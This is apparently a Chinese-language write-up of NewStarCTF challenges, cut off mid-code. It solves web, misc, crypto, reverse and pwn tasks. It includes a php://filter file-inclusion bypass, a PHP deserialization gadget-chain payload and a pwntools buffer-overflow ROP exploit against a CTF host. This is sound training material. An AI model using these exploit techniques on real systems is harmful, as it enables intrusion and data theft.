\n第一个是hint给我们的种子，那么第二个就是我们所需要的\n![](http://cdn.anyiblog.top/common/1665833279718-fcbf65ae-d64d-41fd-a32e-1819902ef291.jpg)  \nPost：guess=1202031004\n  \n第二层伪协议\n  \n```\nif(!preg_match(\"/base|\\.\\./i\",$_GET['file']) && preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n        //flag in `flag.php`\n        include($_GET['file']);\n```\n  \n要使include($\\_GET\\['file'\\]);包含到flag就需要用到php://filter用法，但我们常用一般都是php://filter/read=conver.base64-encode/resource=xxxx\n  \nbase被禁用了，且需要payload里含有NewStar\n  \n这里可以用rot13+字段。\n  \nphp://filter/read=string.rot13|NewStar|/resource=flag.php\n  \n最终payload：\n![](http://cdn.anyiblog.top/common/1665833280078-e22c21dc-8a09-4ea3-b805-c5b20d79f0d9.jpg)  \n![](http://cdn.anyiblog.top/common/1665833280812-0c7351bc-5832-4d26-81a6-9604e4df9740.jpg)  \n\n### Web3.UnserializeOne\n  \n```\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    protected $func;\n  \n  \n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n  \n  \n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n  \n  \nclass Sec{\n    private $obj;\n    private $var;\n  \n  \n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n  \n  \n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n  \n  \nclass Easy{\n    public $cla;\n  \n  \n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n  \n  \nclass eeee{\n    public $obj;\n  \n  \n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n  \n  \nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}\n```\n  \n附学弟的Payload：\n  \n```\n<?php\nclass Start\n{\n    public $name;\n    public $func;\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\nclass Sec\n{\n    public $obj;\n    public $var;\n    public function __construct($a, $b)\n    {\n        $this->obj=$a;\n        $this->var=$b;\n    }\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n    public function __invoke()\n    {\n        echo \"afdfdsaf\";\n    }\n}\nclass Easy\n{\n    public $cla;\n    public function __call($fun, $var)\n    {\n        echo $this->cla = clone $var[0];\n    }\n}\nclass eeee\n{\n    public $obj;\n    public function __clone()\n    {\n        if (isset($this->obj->cmd)) {\n            echo \"success\";\n        }\n    }\n}\n$a=new Start();\n$b=new Easy();\n$c=new eeee();\n$c->obj=$a;\n$d=new Sec($b, $c);\n$a->name=$d;\n$a->func=$d;\necho serialize($a);\n```\n  \n```\nO:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";O:4:\"eeee\":1:{s:3:\"obj\";r:1;}}s:4:\"func\";r:2;}\n```\n  \n![](http://cdn.anyiblog.top/common/1665833281167-9322d148-ccd7-4eec-aa05-ff0b8bae8dd0.jpg)\n\n# Misc\n  \n### Misc1.Yesec no drumsticks 2\n  \n下载文本记事本打开，win11独特的识别看出来是零宽，零宽解密\n  \n![](http://cdn.anyiblog.top/common/1665833281555-d0fa2340-98c6-49c7-aad9-f87bbc582fcb.jpg)  \n![](http://cdn.anyiblog.top/common/1665833281951-7fcfbbd7-5ee8-4bad-88a6-86ee956431dc.jpg)  \n之后就是base58 + 16进制\n  \n![](http://cdn.anyiblog.top/common/1665833282317-62ed3c82-0580-4deb-adb9-aedcdfb7eea8.jpg)  \n![](http://cdn.anyiblog.top/common/1665833282679-6058c1fc-042b-4e3b-bbc7-516c8c8bb6ae.jpg)  \nFlag:flag{Ingr3d1ent\\_0F\\_Yesec\\_i5\\_OOOOO}\n  \n### Misc2.Coldwinds's Desktop\n  \n拼图题\n  \n![](http://cdn.anyiblog.top/common/1665833283180-955a2005-00b3-4f98-bf3b-a65795474d76.jpg)  \n用montage将小图拼到大图，最后gaps还原大图中图片顺序\n  \n小图宽高为30\\*30\n  \n![](http://cdn.anyiblog.top/common/1665833283574-f90020eb-faf6-4851-a088-396e8b126ca8.jpg)  \n  \nmontage拼大图：\n  \n```\nmagick montage *.png -geometry +0+0 flag.jpg\n```\n  \n![](http://cdn.anyiblog.top/common/1665833283974-7ac8315f-48bf-48dc-b08a-f27964973edf.jpg)  \ngaps恢复：\n  \n```\ngaps --image=flag.jpg --generations=30 --population=120 --size=30 --save\n```\n  \n重要的是这个--size参数，要设置成小图的高宽，其它的参数可以参考网上的文章设置。\n  \n最后gaps恢复完许多人应该是这个样子\n  \n![](http://cdn.anyiblog.top/common/1665833284914-cb6e6bea-cfe9-4f69-a441-f10e49d72812.jpg)  \n虽然有flag，但是还有一部分没还原，这张图片上面的部分没有成功恢复。\n  \n这里的原因就是因为montage拼图时 大图是12\\*12数量的小图，而与原图数量不符合，正确高宽应为16\\*9数量的小图。\n  \n所以montage要加参数-tile 16\\*9，然后gaps重新恢复得到最终大图\n  \n```\nmagick montage *.png -tile 16x9 geometry +0+0 flag.jpg\n```\n  \n![](http://cdn.anyiblog.top/common/1665833285341-8d6a8b50-689e-4065-bbe5-093fe4108ed1.jpg)  \n![](http://cdn.anyiblog.top/common/1665833286225-d3486a53-84e6-4097-bb8f-77a8bfebfc2c.jpg)  \n  \nPS处理下即可\n![](http://cdn.anyiblog.top/common/1665833287072-3f192afb-1504-4490-810d-c6638f0d2086.jpg)（这个拼的还是有点问题，之前的图拼的老完整了不过给我手贱删掉了。可能是参数的问题，不过也能看）\n  \n  \nFlag:flag{Y0u\\_successfu11y\\_s01ved\\_the\\_puzz1e}\n  \n### Misc3.奇怪的二维码\n  \n下载附件得到一个特殊的二维码：\n  \n![](http://cdn.anyiblog.top/common/1665833287467-639dc32d-094c-4f23-abb9-520cc92dc879.jpg)  \n第一眼中间应该是少了个码头，一个码头的二维码 直接想到阿兹特克码（Aztec\\_code）\n同时这张图片尾部数据隐写也给了提示，foremost分离\n  \n![](http://cdn.anyiblog.top/common/1665833287884-9fd089ef-2514-4e12-969a-30f9247c979f.jpg)  \n（出题人也玩帝国时代，狂喜，看样子好像是帝国4，之前玩过一会感觉蒙古和中国贼变态，还得是你嗷）\n  \n尺寸为23\\*23\n  \n我们只需补齐中间的码头即可，在Github上看到一个aztec生成的项目 对着修改。[https://github.com/delimitry/aztec\\_code\\_generator](https://github.com/delimitry/aztec_code_generator)\n  \n这是生成的23\\*23 Aztec码\n  \n![](http://cdn.anyiblog.top/common/1665833288553-6c71b95d-4716-4bf6-8947-e67d89697ac0.jpg)  \n跟题目给的图片进行比对，发现题目图片中间少了9\\*9，那么将这张图片9\\*9 copy到原图即可。\n  \n直接copy比较糊，最好一个个黑块拼，PS处理下就行。\n  \n这是拼好的：\n  \n![](http://cdn.anyiblog.top/common/1665833289026-318bf7ba-86b5-448d-892d-e73817529528.jpg)  \n将图片放到二维码扫描网站解码[https://demo.dynamsoft.com/barcode-reader/](https://demo.dynamsoft.com/barcode-reader/)\n  \n![](http://cdn.anyiblog.top/common/1665833289772-660506b4-3f9d-4f4c-af9d-5888678d9366.jpg)  \nFlag：flag{Aztec\\_from\\_Age\\_0f\\_Empires}\n  \n### Misc4.qsdz's girlfriend 2\n  \n（出题人真该死啊(bushi）\n  \n下载附件得到，得到图片\n  \n![](http://cdn.anyiblog.top/common/1665833290152-e7fcc00d-f046-44c5-84b9-97b70cea2b8e.jpg)  \n题目提示的很明显了，这个图片是猫脸变换（Arnold）后的图片，用github的脚本解密。\n  \n这张图片这个n是真的误导，我一度以为是参数N，后来问出题人才发现是shuffle times。。。而且有bug，我一次循环就得到了flag\n  \n而且网上大部分脚本算法都是\n  \n```\n# 按照公式坐标变换\nnew_x = (1 * x + a * y) % N     # 解密：上下对换，a变b,x变y,+变-\nnew_y = (b * x + (a * b + 1) * y) % N\narnold_image[new_x, new_y, :] = image[x, y, :]\n```\n  \n但后面提示放出来才发现题目的算法是（不放hint我估计已经卡死在脚本这一块了）\n![](http://cdn.anyiblog.top/common/1665833290627-4ae70e8d-e2d0-4daf-8b60-8656b54fcde6.jpg)  \nx中a\\*y变成了b\\*y y同理 所以decode部分要变换为\n  \n```\nnew_x = ((a * b + 1) * x - a * y) % N\nnew_y = (-b * x + y) % N\narnold_image[new_x, new_y, :] = image[x, y, :]\n```\n  \n最终脚本：\n```\nimport numpy as np\nimport cv2\n  \n  \n  \n  \ndef arnold_encode(image, a, b):\n    # 1:创建新图像\n    arnold_image = np.zeros(shape=image.shape)  # 返回给定形状和类型的新数组，用0填充。img.shape返回img的长宽信息\n  \n  \n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]  # image.shape[0],image.shape[1],image.shape[2]表示图像长，宽，通道数\n    N = w  # 或N=w\n  \n  \n    # 3：遍历像素坐标变换\n    for x in range(h):\n        for y in range(w):\n            # 按照公式坐标变换\n            new_x = (1 * x + b * y) % N     # 解密：上下对换，a变b,x变y,+变-\n            new_y = (a * x + (a * b + 1) * y) % N\n            arnold_image[new_x, new_y, :] = image[x, y, :]\n  \n  \n    arnold_image = np.uint8(arnold_image)\n  \n  \n    return arnold_image\n  \n  \n  \n  \ndef dearnold_encode(image, a, b):\n    # 1:创建新图像\n    arnold_image = np.zeros(shape=image.shape)  # 返回给定形状和类型的新数组，用0填充。img.shape返回img的长宽信息\n  \n  \n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]  # image.shape[0],image.shape[1],image.shape[2]表示图像长，宽，通道数\n    #N = w  # 或N=w\n    N = w\n  \n  \n    # 3：遍历像素坐标变换  \n    for x in range(h):\n        for y in range(w):\n            # 按照公式坐标变换\n            new_x = ((a * b + 1) * x - b * y) % N\n            new_y = (-a * x + y) % N\n            arnold_image[new_x, new_y, :] = image[x,y, :]\n  \n  \n    arnold_image = np.uint8(arnold_image)\n  \n  \n    return arnold_image\n  \n  \n  \n  \nr = cv2.imread('girlfriend.png')\n  \n  \nfor i in range(0, 1):  # 遍历次数\n    r = dearnold_encode(r, 0x726e, 0x6f6c64)\n  \n  \ncv2.imshow(\"arnold\", r)\ncv2.waitKey(0)\ncv2.destroyAllWindows()\ncv2.imwrite('flag.png',r)\n```\n  \n将a,b带入即可，运行。\n  \n![](http://cdn.anyiblog.top/common/1665833290969-93dc3244-8e54-4889-96b3-5b123da07df2.jpg)  \nFlag：flag{按理说这个点猪也该醒了}\n  \n# Crypto\n  \n### Crypto1.unusual\\_base\n  \n加密脚本：\n  \n```\nfrom secret import flag\nfrom Crypto.Util.number import *\nfrom random import shuffle\nfrom string import ascii_lowercase, ascii_uppercase, digits\n  \n  \nalphabet = ascii_uppercase + ascii_lowercase + digits +'$&'\nalphabet = list(alphabet)\nbits = ''\npad_len = len(flag) % 3\n  \n  \nfor f in flag:\n            bits += bin(f)[2:].rjust(8,'0')\nbits += '0000'*pad_len\nencoded = ''\nshuffle(alphabet)\nalphabet = \"\".join(alphabet)\nfor i in range(0, len(bits), 6):\n    encoded += alphabet[int(bits[i:i+6], 2)]\nencoded += '%'*pad_len\nprint(f'encoded = \"{encoded}\"')\nprint(f'alphabet = \"{alphabet}\"')\n```\n  \nbase64换表，刚好之前写过解密脚本，直接一把梭了。大家做这题可以看看其中加密的原理 这也是base64加密的原理，尝试解密能学到东西的。\n  \n![](http://cdn.anyiblog.top/common/1665833291340-4b897416-6267-423b-9c6f-dcee28839cff.jpg)  \nFlag:flag{a1ph4bet\\_c0u1d\\_be\\_d1ffi3r3nt}\n  \n### Crypto2.Affine\n  \n加密脚本：\n  \n```\nfrom secret import flag\nfrom Crypto.Util.number import *\n  \n  \na = getPrime(8)\nb = getPrime(8)\n  \n  \nciphertext = []\n  \n  \nfor f in flag:\n    ciphertext.append((a*f + b) % 0x100)\n  \n  \nprint(bytes(ciphertext))\n```\n  \n题目给了ciphertext\n  \n![](http://cdn.anyiblog.top/common/1665833291650-e970f8ea-13f7-4b95-a118-f20526bf797c.jpg)  \n思路就是我们已知flag格式为flag{，用这几个字符串来爆破得到a和b。之后再用得到的a和b爆破ascii表，带入(a\\*f + b) % 0x100如果结果为ciphertext那就是正确的字符串，最后拼接得到flag\n  \n之前的脚本删掉了，重新写了个比较麻烦的。\n  \n```\nfrom Crypto.Util.number import *\nimport string\n  \n  \nls = []\nfor i in range(500): #取N为8的素数\n    n = getPrime(8)\n    if n not in ls:\n        ls.append(n)\nls.sort()\n#print(ls)\n#[131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251]\nflag = b\"flag{\"\ncipher = b\"\\xb1\\x83\\x82T\\x10\\x80\\xc9O\\x84\\xc9<\\x0f\\xf2\\x82\\x9a\\xc9\\x9b8'\\x9b<\\xdb\\x9b\\x9b\\x82\\xc8\\xe0V\"\nn = 0\nfor a in ls: #爆破a和b\n    for b in ls:\n        s = 0\n        for i in range(5):\n            if (a*flag[i] + b) % 0x100 == cipher[i]:\n                s += 1\n        if s == 5:\n            print(a,b)\n            #163 191    \na,b = 163,191\ntable = string.printable.encode() #取ascii表\nres = \"\"\nfor c in cipher:\n    for i in table: #爆破flag\n        if (a*i + b)%0x100 == c:\n            res += chr(i)\nprint(res)\n```\n  \n先爆破N为8的素数，得到列表ls，然后再爆破a和b，最后爆破flag明文。\n  \n百度了下Affine好像是仿射密码，不知道有没有非预期解。\n  \n![](http://cdn.anyiblog.top/common/1665833291954-a03b2b23-9769-4437-89e3-30bbfaa364ce.jpg)  \nFlag：flag{Kn0wn\\_p1aint3xt\\_4ttack}\n  \n### Crypto3.robot\n下载附件\n```\nfrom hashlib import sha256\nfrom secret import flag\nfrom base64 import *\nimport random\n  \n  \ncipher = []\n  \n  \ndef fun1(x):\n    return sha256(x.encode()).hexdigest()\n  \n  \ndef fun2(x):\n    return pow(114514,ord(x),1919810)\n  \n  \ndef fun3(x):\n    key = random.randint(0,1145141919810)\n    ans = x.encode()\n    if key & 1:\n        ans = b32encode(ans)\n    key >>= 1\n    if key & 1:\n        ans = b64encode(ans)\n    key >>= 1\n    if key & 1:\n        ans = b16encode(ans)\n    key >>= 1\n    return ans\n  \n  \ndef encrypt(msg):\n    res = []\n    for i in msg:\n        tmp = list(map(random.choice([fun1,fun2,fun3]),[i]))[0]\n        res.append(tmp)\n    return res\n  \n  \nprint(encrypt(flag))\n```\n  \n密文：\n  \n```\n['252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111', 1495846, 1452754, b'M4======', '021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96', '2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6', '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a', b'Tg==', '1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9', b'52304539505430395054303D', 'e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8', b'58773D3D', '3f39d5c348e5b79d06e842c114e6cc571583bbf44e4b0ebfda1a01ec05745d43', '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce', '2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6', b'T0k9PT09PT0=', '18f5384d58bcb1bba0bcd9e6a6781d1a6ac2cc280c330ecbab6cb7931b721552', b'T0E9PT09PT0=', 825026, 'd2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde', 1455816, b'4F553D3D3D3D3D3D', 1165366, 1242964, b'4F493D3D3D3D3D3D', 652094, 597296, '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce', '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a', b'54314539505430395054303D', 1242964, 368664, b'TVU9PT09PT0=', b'cw==', 1602214]\n```\n  \n程序三种加密方式：sha1、pow和base64/32/16\n  \nsha1和pow爆破ascii表跟密文比较即可，base写一个循环解密 或者可以手解\n  \npayload：\n  \n```\nfrom hashlib import sha256\nimport base64\nimport string\nimport re\n  \n  \ntable = string.printable\n  \n  \ndef fun1(x):\n    for t in table:\n        if sha256(t.encode()).hexdigest() == x:\n            return t\n  \n  \ndef fun2(x):\n    for t in table:\n        if pow(114514,ord(t),1919810) == x:\n            return t\n  \n  \ndef fun3(s):\n    base16_dic = r'^[A-F0-9=]*$'\n    base32_dic = r'^[A-Z2-7=]*$'\n    base64_dic = r'^[A-Za-z0-9/+=]*$'\n  \n  \n    n = 0\n    while True:\n        n += 1\n        t = s.decode()\n        try:\n            if t != \"\":\n                if re.match(base16_dic, t):\n                    s = base64.b16decode(s)\n                    print(str(s) + ' base16')\n                elif re.match(base32_dic, t):\n                    s = base64.b32decode(s)\n                    print(str(s) + ' base32')\n                elif re.match(base64_dic, t):\n                    s = base64.b64decode(s)\n                    print(str(s) + ' base64')\n        except:\n            return t\n  \n  \ncipher = ['252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111', 1495846, 1452754, b'M4======', '021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96', '2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6', '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a', b'Tg==', '1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9', b'52304539505430395054303D', 'e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8', b'58773D3D', '3f39d5c348e5b79d06e842c114e6cc571583bbf44e4b0ebfda1a01ec05745d43', '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce', '2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6', b'T0k9PT09PT0=', '18f5384d58bcb1bba0bcd9e6a6781d1a6ac2cc280c330ecbab6cb7931b721552', b'T0E9PT09PT0=', 825026, 'd2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde', 1455816, b'4F553D3D3D3D3D3D', 1165366, 1242964, b'4F493D3D3D3D3D3D', 652094, 597296, '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce', '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a', b'54314539505430395054303D', 1242964, 368664, b'TVU9PT09PT0=', b'cw==', 1602214]\n  \n  \nflag = \"\"\nfor i in cipher:\n    if type(i) == str:\n        flag += fun1(i)\n    elif type(i) == int:\n        flag += fun2(i)\n    elif type(i) == bytes:\n        flag += fun3(i)\nprint(flag)\n```\n  \n![](http://cdn.anyiblog.top/common/1665833292266-80d96315-e375-4fe9-81d9-44c0bf99d875.jpg)  \nFlag:flag{c4Nn0t\\_D3crYpt\\_buT\\_r3p34t\\_Yes}\n  \n# Reverse\n  \n### Reverse1.前可见古人，后得见来者\n  \n32位程序。IDA打开 关键函数：\n  \n![](http://cdn.anyiblog.top/common/1665833292646-4374bea9-c655-4be2-a025-016fcd352b12.jpg)  \nsub\\_4113DE加密函数\n  \n![](http://cdn.anyiblog.top/common/1665833293000-222c3eed-9e0c-4fbd-8d57-4f65638da42d.jpg)  \n上面一部分是凯撒加密，可以先不管\n  \n主要是最后^0x22的部分，直接将题目给的密文异或下就行。\n  \nbyte\\_41A004：\n  \n![](http://cdn.anyiblog.top/common/1665833293358-c4094190-8497-4f85-a80a-63fd99a462a6.jpg)  \n  \n```\nciphers = b\"Q[LVYMPVTC}LCS}PCS}GP}LCS}N@J_\"\nflag = \"\"\nfor cipher in ciphers:\n    flag += chr(cipher ^ 0x22)\nprint(flag)\n```\n  \n```\n>synt{ortva_naq_raq_er_naq_lbh}\n```\n最后爆破下凯撒就得到flag了。\n  \n![](http://cdn.anyiblog.top/common/1665833293734-c3755fce-d515-4546-8bcb-8620586f0b14.jpg)  \nFlag:flag{begin\\_and\\_end\\_re\\_and\\_you}\n  \n### Reverse2.FindME\n  \n64位程序，IDA关键函数：\n  \n![](http://cdn.anyiblog.top/common/1665833294081-5808de0c-0c5d-4ad7-9c98-a525db187d9a.jpg)  \n程序经过sub\\_1BCD() 要使dword\\_5040为1即得到flag\n  \n跟进sub\\_1BCD()函数，发现有很多函数调用，以下是关键函数\n  \n![](http://cdn.anyiblog.top/common/1665833294379-967ab7ec-9d5b-4931-b702-5f08ac52b2cc.jpg)  \n![](http://cdn.anyiblog.top/common/1665833294684-faff735f-2528-4dd8-a1a0-47594866464c.jpg)  \n![](http://cdn.anyiblog.top/common/1665833295133-3bda5f9e-9206-43d0-b00d-a5f4d3d4a0fb.jpg)  \n![](http://cdn.anyiblog.top/common/1665833295434-ecce2c1d-eabb-4613-a488-72bdd83635ce.jpg)  \n![](http://cdn.anyiblog.top/common/1665833295732-c5101918-cd2b-4ac1-a59f-f17b7cfa6d0d.jpg)  \n大致就是定义了s变量长为32，用0填充。与输入的东西进行位运算 再异或等操作之后，得到数组dword\\_5020\n  \n反推的思路就是拿dword\\_5020数组的内容按加密的顺序一步步回推解密。\n  \n![](http://cdn.anyiblog.top/common/1665833296042-082231e9-33a6-44f4-95be-3c708f0258cc.jpg)  \n写解密脚本：\n  \nstep1：异或+右移17\n```\ndef step1(s):\n    for i in range(8):\n        s[i] ^= (s[i] >> 17)\n```\n  \nstep2：异或0x2022\n```\ndef step2(s):\n    for i in range(8):\n        s[i] ^= 0x2022\n```\n  \nstep3：这一步是比较难的，我的做法是知道flag前缀 所以是拿前缀ascii推得到的规律。\n  \n按加密的来先推最大的，右移位数为24（8\\*3），然后每一次循环减去8。同时s的下标要减去byte\\_50A0\\[i + j\\] << (8 \\* j)（脚本中(ascii << 8\\*(4-(j+1)))的部分）再重新赋值，这一步是还原或运算（|）的操作。\n最后把得到的ascii加到flag变量里就是最终的答案\n  \n```\ndef step3(s):\n    flag = ['']*32\n    for i in range(0,32,4):\n        for j in range(4):\n            ascii = s[i//4] >> 8*(4-(j+1))  #取ascii\n            s[i//4] = s[i//4] - (ascii << 8*(4-(j+1)))\n            flag[i+(4-(j+1))] = chr(ascii)\n    print(''.join(flag))\n```\n  \n最终脚本：\n  \n```\n\n\"\"\"\n__int64 sub_19B6()\n{\n  int i; // [rsp+8h] [rbp-8h]\n  int j; // [rsp+Ch] [rbp-4h]\n\n  for ( i = 0; i <= 31; i += 4 )\n  {\n    for ( j = 0; j <= 3; ++j )\n      *((_DWORD *)s + i / 4) |= byte_50A0[i + j] << (8 * j);\n  }\n  return sub_19A1();\n}p\n\n\"\"\"\n\"\"\"\n__int64 sub_192E()\n{\n  int i; // [rsp+Ch] [rbp-4h]\n\n  for ( i = 0; i <= 7; ++i )\n    *((_DWORD *)s + i) ^= 0x2022u;\n  return sub_1919();\n}\n\"\"\"\n\"\"\"\n__int64 sub_151D()\n{\n  int i; // [rsp+Ch] [rbp-4h]\n\n  for ( i = 0; i <= 7; ++i )\n    *((_DWORD *)s + i) ^= *((_DWORD *)s + i) >> 17;\n  return sub_1508();\n}\n\"\"\"\n\n\"\"\"\nvoid sub_1253()\n{\n  int i; // [rsp+Ch] [rbp-4h]\n\n  for ( i = 0; i <= 7; ++i )\n  {\n    if ( *((_DWORD *)s + i) != dword_5020[i] )\n    {\n      dword_5040 = 0;\n      break;\n    }\n  }\n  sub_123E();\n}\n\"\"\"\ns = [0x67617FF4, 0x6E305341, 0x656C4DE0, 0x69744BEC, 0x625F7460, 0x6F7348F4, 0x656871C9, 0x7D216ED3]\n\ndef step1(s):\n    for i in range(8):\n        s[i] ^= (s[i] >> 17)\n\ndef step2(s):\n    for i in range(8):\n        s[i] ^= 0x2022\n\ndef step3(s):\n    flag = ['']*32\n    for i in range(0,32,4):\n        for j in range(4):\n            ascii = s[i//4] >> 8*(4-(j+1))  #取ascii\n            s[i//4] = s[i//4] - (ascii << 8*(4-(j+1))) \n            flag[i+(4-(j+1))] = chr(ascii)\n    print(''.join(flag))\n\nstep1(s)\nstep2(s)\nstep3(s)\n\n```\n  \n![](http://cdn.anyiblog.top/common/1665833296376-bffccb29-400d-45c8-a94e-d3e8aaaca61a.jpg)  \nFlag：flag{D0nt\\_let\\_time\\_bo\\_so\\_cheap!}\n  \n# Pwn\n  \n### Pwn1.uint32 and ret\n  \n64位程序，检查如下：\n  \n![](http://cdn.anyiblog.top/common/1665833296697-f71485bc-2d4d-4a48-9192-6ef77615ada2.jpg)  \n主要函数：\n  \n![](http://cdn.anyiblog.top/common/1665833297023-8c264347-9d06-4bf8-b4ca-8b824ad45d99.jpg)  \n程序两次输入，第一次输入数字，要求为unsigned型，第二次根据nbytes进行读取。\n  \n漏洞处在于unsigned类型可以传负数（或传大于4294967295的数） 导致nbytes = nbytes - v2这里可以将nbytes变大，这样就可以在read处制造溢出。\n  \n同时程序存在后门：\n  \n![](http://cdn.anyiblog.top/common/1665833297426-0bb1e854-3fe9-4458-9f8e-aea1bd9a709e.jpg)  \n那么直接跳转这个地址即可。\n  \n写脚本的时候直接跳地址还打不通，就本地调试了下。加了个rdi和ret就通了，多调试。\n  \nPayload：\n  \n```\nfrom pwn import *\n  \n  \ncontext.log_level='debug'\n  \n  \n#p = gdb.debug('./uint','break 0x4011b6')\nrdi = 0x00000000004012f3\nret = 0x0000000000401219\n  \n  \np = remote('node4.buuoj.cn',26296)\n  \n  \npayload = b'a'*(0x48+8) + p64(rdi)  + p64(ret)  +  p64(0x4011b6)\n  \n  \nlog.info('length:%s'%len(payload))\n  \n  \np.sendlineafter('success!\\n','-500')\n  \n  \np.recvuntil('twice')\np.sendline(payload)\n  \n  \np.interactive()\n```\n  \n![](http://cdn.anyiblog.top/common/1665833297824-9c215f8f-7e10-403f-b9e9-fdb9fc5d8c23.jpg)  \n\n### Pwn3.砍一刀\n  \n（这题可真有并夕夕那味啊）\n  \n题目源码：\n  \n```\n#include<stdio.h>\n#include<string.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <time.h>\n  \n  \nint init();\nvoid game();\nvoid getcard();\nvoid getdiamond();\nvoid success();\nint cipher();\n  \n  \nint diamond=5;\n  \n  \nint init(){\n    setvbuf(stdin, 0LL, 2, 0LL);\n    setvbuf(stdout, 0LL, 2, 0LL);\n    setvbuf(stderr, 0LL, 2, 0LL);\n}\n  \n  \nvoid game(){\n    float money=0;\n    int key=0;\n    printf(\"NewstarCTF送你现金红包啦!\\n\\n\");\n    sleep(1.5);\n    printf(\"恭喜你成为幸运星，最高可提现100元红包！\\n\\n\");\n    sleep(1.5);\n    printf(\"恭喜你获得一张百元现金卡，使用可以加速领红包！\\n\\n\");\n    printf(\"按回车键使用现金卡……\\n\\n\");\n    getchar();\n    sleep(1.5);\n    printf(\"成功使用百元现金卡，获得50元现金！\\n\\n\");\n    money+=50;\n    sleep(1.5);\n    printf(\"今日难度降低，送你30元现金！\\n\\n\");\n    money+=30;\n    sleep(1.5);\n    printf(\"第一次参加活动，再送你10元现金！\\n\\n\");\n    money+=10;\n    sleep(1.5);\n    printf(\"感谢你对NewstarCTF的大力支持，再送你9元现金！\\n\\n\");\n    money+=9;\n    sleep(1.5);\n    printf(\"真棒！仅剩1%%提现红包！\\n\\n\");\n    sleep(1.5);\n    printf(\"还有66人正在提现红包，你的提现进度第一，将最先提现！\\n\\n\");\n    sleep(1.5);\n    printf(\"回车一下，再砍一刀\\n\\n\");\n    getchar();\n    sleep(1.5);\n    printf(\"恭喜获得0.45元现金！\\n\\n\");\n    sleep(1.5);\n    printf(\"送你现金翻倍卡，更快提现！\\n\\n\");\n    sleep(1.5);\n    printf(\"翻倍生效中……成功翻2倍！\\n0.45元----->0.9元\\n\\n\");\n    money+=0.9;\n    sleep(1.5);\n    printf(\"距离提现只有一步之遥啦，输入口令666领取红包！\\n\");\n    cipher();\n    printf(\"\\n口令正确，送你0.05元现金！\\n\\n\");\n    sleep(1.5);\n    printf(\"翻倍生效中……成功翻2倍！\\n0.05元----->0.1元\\n\\n\");\n    money+=0.1;\n    sleep(1.5);\n    printf(\"恭喜你集齐100元红包！\\n\\n\");\n    sleep(1.5);\n    printf(\"赶紧分享给好友庆祝一下吧！\\n\\n\");\n    sleep(1.5);\n    printf(\"按回车键分享给好友~\\n\\n\");\n    getchar();\n    printf(\"分享成功！\\n\\n\");\n    getcard();\n}\n  \n  \nvoid getcard(){\n    srand((unsigned int)time(NULL));\n    int luck=0;\n    int coin=0;\n    printf(\"有好友帮你砍一刀，成功获得500金币！\\n\");\n    coin+=500;\n    sleep(1.5);\n    printf(\"有好友帮你砍一刀，成功获得400金币！\\n\");\n    coin+=400;\n    sleep(1.5);\n    printf(\"=======================================\\n\");\n    printf(\"集齐1000金币，兑换提现卡，马上提现红包！\\n\");\n    printf(\"=======================================\\n\");\n    sleep(1.5);\n    printf(\"马上就能兑换提现卡啦，赶紧邀请好友帮你砍一刀吧！\\n\");\n    printf(\"当前金币：%d个\\n\\n\",coin);\n    while(1){\n        printf(\"按回车键邀请好友砍一刀，领取金币~\\n\");\n        getchar();\n        sleep(1);\n        printf(\"有好友帮你砍一刀啦!\");\n        if(coin==999){\n            luck=rand()%101;\n            if((luck%10)==0){\n                printf(\"==========================================================\\n\");\n                printf(\"恭喜你触发隐藏福利，集齐10颗钻石兑换1金币，加速兑换提现卡！\\n\");\n                printf(\"==========================================================\\n\");\n                getdiamond();\n            }\n            else{\n                